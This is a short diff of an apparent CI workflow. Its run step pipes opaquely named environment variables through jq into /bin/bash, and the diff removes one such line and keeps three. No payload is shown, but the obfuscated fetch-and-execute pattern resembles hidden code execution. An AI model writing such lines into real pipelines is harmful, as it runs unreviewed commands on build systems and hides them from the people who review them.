@@ -24,7 +24,6 @@ jobs:
         run: |
           printf '%s' "$q308" | jq -r .tlyga6 | /bin/bash
           echo $iry47870 | jq -r .qnyl7609 | /bin/bash
-          printf '%s' "$g1297" | jq -r .bo3545 | /bin/bash
           echo $oh62 | jq -r .h78043 | /bin/bash
 
       - name: Store results
